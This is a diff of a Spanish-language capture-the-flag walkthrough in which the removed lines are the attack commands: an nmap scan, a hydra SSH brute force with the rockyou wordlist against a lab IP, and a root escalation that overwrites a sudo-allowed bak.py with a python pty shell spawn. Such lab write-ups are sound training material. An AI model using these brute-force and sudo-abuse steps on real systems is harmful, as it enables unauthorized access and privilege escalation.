@@ -6,9 +6,6 @@ El primer paso es realizar un escaneo de puertos para conocer los servicios expu
 
 ![](Imagenes/1.png)
 
-```bash
-nmap -sC -sV -O -A 10.10.61.221
-```
 
 ## Paso 2 - Acceso a la Página Web.
 
@@ -30,20 +27,12 @@ Como vimos antes el SSH estaba abierto en el puerto 22 vamos hacer una fuerza br
 
 Probaremos con el usuario meliodas, este seria el comando para hacer fuerza bruta con hydra.
 
-```bash
-hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.61.221 ssh
-```
-
 ![](Imagenes/4.png)
 
 Ya tenemos la contraseña de meliodad.
 
-
 ## Paso 5 - Hacemos login por ssh.
 
-```bash
-ssh meliodas@10.10.61.221 
-```
 ![](Imagenes/5.png)
 
 Como vemos en la imagen somos usuarios normal, vamos a probar ser root mas tarde para sacar la ultima flags
@@ -65,29 +54,19 @@ El fichero con la extensión .bak.py probablemente sea un archivo de respaldo (b
 
 Dado que bak.py tiene permisos para ejecutarse con sudo NOPASSWD, Vamos a elimínarlo y crea un nuevo archivo.
 
-```bash
-rm bak.py
-```
 
 ![](Imagenes/8.png)
 
-```bash
-echo 'import pty;pty.spawn("/bin/sh")' > /home/meliodas/bak.py
-```
 
 ![](Imagenes/9.png)
 
 ## Paso 8 - Ejecutamos el Bak.py y Buscamos la ultima Flag.
 
-```bash
-sudo python /home/meliodas/bak.py
-```
 Como dato la terminal es un mala para negavar
 
 ![](Imagenes/10.png)
 
 
 ![](Imagenes/11.png)
-
 
 Ya Habriamos terminado la maquina.
